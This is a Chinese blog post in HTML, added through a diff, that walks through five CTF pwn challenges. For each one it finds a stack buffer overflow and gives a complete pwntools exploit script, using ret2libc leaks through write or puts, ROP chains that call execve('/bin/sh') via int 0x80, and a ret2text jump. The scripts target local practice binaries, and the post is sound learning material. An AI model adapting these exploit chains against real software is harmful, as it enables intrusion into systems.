@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    PWN题练一下 |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-vpgk9n" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      PWN题练一下
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2019/11/10/vpgk9n/" class="article-date">
+  <time datetime="2019-11-10T05:41:56.000Z" itemprop="datePublished">2019-11-10</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="LEVEL3"><a href="#LEVEL3" class="headerlink" title="LEVEL3"></a>LEVEL3</h1><p>首先检查一下保护<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813789-ab0d1052-20be-4c90-81eb-23ca19e3458b.png#align=left&display=inline&height=213&originHeight=213&originWidth=730&size=0&status=done&style=none&width=730" alt=""></p>
+<p>在 IDA 里面发现了 vulnerable_function read 函数存在溢出<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813876-a0826a31-b0b4-4913-92c0-a031006a696f.png#align=left&display=inline&height=170&originHeight=170&originWidth=341&size=0&status=done&style=none&width=341" alt=""></p>
+<p>计算溢出<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813720-1450a8a2-179d-4e49-97c7-d5b5e11e08f0.png#align=left&display=inline&height=416&originHeight=416&originWidth=1200&size=0&status=done&style=none&width=1200" alt=""></p>
+<p>可以看到溢出长度是 140</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813888-40a886b0-071c-4e5c-999a-359594db60bf.png#align=left&display=inline&height=117&originHeight=117&originWidth=524&size=0&status=done&style=none&width=524" alt=""></p>
+<p>但同时我们 IDA 里没有发现 /bin/sh  等字符串</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813738-f9be254f-940d-411d-a512-70492a555162.png#align=left&display=inline&height=312&originHeight=312&originWidth=600&size=0&status=done&style=none&width=600" alt=""></p>
+<p>但是我们看到了 write，可以通过 write  泄漏 libc，来使用 libc  中的 system 和 /bin/sh</p>
+<p>首先通过 write  得到 write  函数的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level3'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">payload1=<span class="string">'A'</span>*<span class="number">140</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">0x1</span>)+p32(write_got)+p32(<span class="number">0x4</span>)</span><br><span class="line"><span class="comment">#write 函数原型是 write(1,address,len) ，1表示标准输出流 ，address 是 write 函数要输出信息的地址 ，而 len 表示输出长度</span></span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#通过 LibcSeacher 获得 libc 版本</span></span><br><span class="line">libc=LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line"><span class="comment">#计算 libc 的地址</span></span><br><span class="line">libcbase=write_addr-libc.dump(<span class="string">"write"</span>)</span><br><span class="line"><span class="comment">#计算 system 地址</span></span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">"system"</span>)</span><br><span class="line"><span class="comment">#计算 /bin/sh 地址</span></span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">140</span>+p32(system_addr)+p32(<span class="number">0xbeadbeef</span>)+p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="PWN5"><a href="#PWN5" class="headerlink" title="PWN5"></a>PWN5</h1><p>检查一下保护<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135997-c9ab110a-c12e-438d-8bea-99fc3d76b34f.png#align=left&display=inline&height=217&originHeight=217&originWidth=726&size=0&status=done&style=none&width=726" alt=""></p>
+<p>IDA 查看也没找到 system  与 /bin/sh<br>找到会发生溢出的地方<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135772-96ea58bd-bd0e-4c06-a41c-dc80ea173127.png#align=left&display=inline&height=193&originHeight=193&originWidth=676&size=0&status=done&style=none&width=676" alt=""></p>
+<p>计算一下溢出，当选择 2 的时候能到我们找到的产生溢出的地方<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135862-6a952c96-07a7-482c-af66-eb93c32406fe.png#align=left&display=inline&height=315&originHeight=315&originWidth=691&size=0&status=done&style=none&width=691" alt=""></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135787-742338cd-f1f4-428e-b9f9-f6d48571295c.png#align=left&display=inline&height=371&originHeight=371&originWidth=1200&size=0&status=done&style=none&width=1200" alt=""></p>
+<p>IDA 查看也没找到 system  与 /bin/sh<br>这次我们构造 execve(“/bin/sh”,NULL,NULL)  直接弹出 shell</p>
+<p>只要把对应获取 shell  的系统调用的参数放到对应的寄存器中，那么我们执行  int 0x80  就可以执行对应的系统调用</p>
+<p>使用以下命令来寻找控制 eax  的 gadgets<br>ROPgadget –binary pwn5 –only ‘pop|ret’ | grep ‘eax’<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135788-7a81f21a-85e7-4d3e-9c89-3629af61380c.png#align=left&display=inline&height=130&originHeight=130&originWidth=725&size=0&status=done&style=none&width=725" alt=""></p>
+<p>选第三个，0x080bc396</p>
+<p>使用以下命令来寻找控制 ebx 的 gadgets<br>ROPgadget –binary pwn5 –only ‘pop|ret’ | grep ‘ebx’<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135766-ff2d2817-fa72-4e8b-aba9-328f27839ee3.png#align=left&display=inline&height=583&originHeight=583&originWidth=782&size=0&status=done&style=none&width=782" alt=""></p>
+<p>选择  0x080733b0</p>
+<p>查找 /bin/sh  的字符串：<br>ROPgadget –binary pwn5 –string ‘/bin/sh’<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135864-3ec39936-170d-4966-9571-ad903986d560.png#align=left&display=inline&height=79&originHeight=79&originWidth=664&size=0&status=done&style=none&width=664" alt=""></p>
+<p>并没有找到，但是我们可以在程序要求写入的时候写进去，这里我们选择在  first_name  缓冲区写入：0x080F1A20<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135796-5c2c8f9c-1948-4f61-bf20-bcfdfefa50ab.png#align=left&display=inline&height=204&originHeight=204&originWidth=800&size=0&status=done&style=none&width=800" alt=""></p>
+<p>查找 int 80  的地址:0x08071005<br>ROPgadget –binary pwn5 –only ‘int’<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135780-2937d8ce-0baa-47b7-bf94-fa2281bba678.png#align=left&display=inline&height=181&originHeight=181&originWidth=607&size=0&status=done&style=none&width=607" alt=""></p>
+<p>exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn5'</span>)</span><br><span class="line">pop_eax_addr = <span class="number">0x080bc396</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x080733b0</span></span><br><span class="line">int_0x80_addr = <span class="number">0x08071005</span></span><br><span class="line">bin_sh_addr = <span class="number">0x080F1A20</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">32</span></span><br><span class="line">payload += p32(pop_eax_addr)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_addr)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(bin_sh_addr)</span><br><span class="line">payload += p32(int_0x80_addr)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.sendline(<span class="string">"yichen"</span>)</span><br><span class="line">p.sendline(<span class="string">"pwn"</span>)</span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="simplerop"><a href="#simplerop" class="headerlink" title="simplerop"></a>simplerop</h1><p>检查一下：<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949767774-a4f3e96d-8197-4c18-814f-90f92879a9db.png#align=left&display=inline&height=215&originHeight=215&originWidth=727&size=0&status=done&style=none&width=727" alt=""></p>
+<p>在 IDA  里面发现  read  造成溢出漏洞<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949767697-84385e41-12cf-4f7d-9a62-3799e648508c.png#align=left&display=inline&height=218&originHeight=218&originWidth=611&size=0&status=done&style=none&width=611" alt=""></p>
+<p>测试一下溢出长度：<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949767830-2e0ea3db-0e68-41c5-922a-b3ee486dcb6d.png#align=left&display=inline&height=287&originHeight=287&originWidth=1064&size=0&status=done&style=none&width=1064" alt=""></p>
+<p>所以我们的思路是：32 个垃圾数据 + execve(“/bin/sh”, 0, 0)<br>注意：<br>没有 system 需要构造 execve 没有 /bin/sh 得自己写入，写入的话 32 位 最多 一次写 4bit 所以得分两次写</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./simplerop'</span>)</span><br><span class="line">int_0x80 = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806e850</span></span><br><span class="line">data_addr = <span class="number">0x080ea060</span></span><br><span class="line">mov__edx__eax_ret = <span class="number">0x0809a15d</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e82a</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">32</span></span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(data_addr)<span class="comment">#用 edx 存放 data_addr</span></span><br><span class="line">payload += p32(pop_eax_ret)</span><br><span class="line">payload += <span class="string">"/bin"</span> <span class="comment">#用 eax 存放 /bin</span></span><br><span class="line">payload += p32(mov__edx__eax_ret)<span class="comment">#把 eax 的内容（/bin）移动到 edx（这里是个地址）处也就是说 edx_addr(.data_addr) 存放/bin 也就是 在data段内写入/bin</span></span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(data_addr + <span class="number">0x4</span>)<span class="comment">#用 edx 存放 data_addr + 0x4</span></span><br><span class="line">payload += p32(pop_eax_ret)</span><br><span class="line">payload += <span class="string">"/sh\x00"</span> <span class="comment">#用 eax 存放 /sh\x00 （截断）</span></span><br><span class="line">payload += p32(mov__edx__eax_ret)<span class="comment">#把 eax 的内容（/sh\x00）移动到 edx 处 也就是说 edx_addr （.data_addr + 0x4）存放 /sh\x00 也就是(data + 0x4)也在data段写入/sh\x00</span></span><br><span class="line">payload += p32(pop_eax_ret)</span><br><span class="line">payload += p32(<span class="number">0xb</span>) <span class="comment">#用 eax 存放 0xb(execve 的系统调用号)</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(data_addr) <span class="comment">#传入参数 execve("/bin/sh", 0, 0)（./data_addr存放 了"/bin/sh"）</span></span><br><span class="line">payload += p32(int_0x80) <span class="comment">#截断</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="低级魔法"><a href="#低级魔法" class="headerlink" title="低级魔法"></a>低级魔法</h1><p>检查一下：<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781367-21ee5c35-56d9-464d-9653-5ff7c948fde8.png#align=left&display=inline&height=239&originHeight=239&originWidth=728&size=0&status=done&style=none&width=728" alt=""></p>
+<p>当选择 4  的时候发现溢出<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781381-fa739aeb-127e-4129-a2a6-401d0a689475.png#align=left&display=inline&height=196&originHeight=196&originWidth=476&size=0&status=done&style=none&width=476" alt=""></p>
+<p>在 IDA  中看到 cat flag<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781411-f4ca8704-a39c-4450-a1b9-2897e14e9371.png#align=left&display=inline&height=320&originHeight=320&originWidth=884&size=0&status=done&style=none&width=884" alt=""></p>
+<p>看一下溢出点<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781330-9829c0db-c846-42bb-8b49-7e1adcf69902.png#align=left&display=inline&height=283&originHeight=283&originWidth=1040&size=0&status=done&style=none&width=1040" alt=""></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">offset=<span class="number">22</span></span><br><span class="line">catflag=<span class="number">0x80485A7</span></span><br><span class="line">payload=<span class="string">'a'</span>*offset+p32(catflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="高级魔法"><a href="#高级魔法" class="headerlink" title="高级魔法"></a>高级魔法</h1><p>这个题目跟上一个题逻辑一致，但是去掉了 cat flag，所以需要实现 system(“/bin/sh”)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">"pwn"</span>)</span><br><span class="line">p=remote(<span class="string">"127.0.0.1"</span>,<span class="number">10002</span>)</span><br><span class="line">offset=<span class="number">22</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"success\n"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*offset+p32(elf.plt[<span class="string">'puts'</span>])+p32(<span class="number">0x0804862E</span>)+p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_addr=puts_addr-libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system=libc_addr+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh=libc_addr+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(offset*<span class="string">"a"</span>+p32(system)+p32(<span class="number">4</span>)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2019/11/10/vpgk9n/" data-id="ckco0htxi000gh4u94kz5c69s" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2019/11/14/bp97ri/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            BUU-PWN题（1-40）
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/11/10/zzg02e/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">pwn入门（蒸米ROP）</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
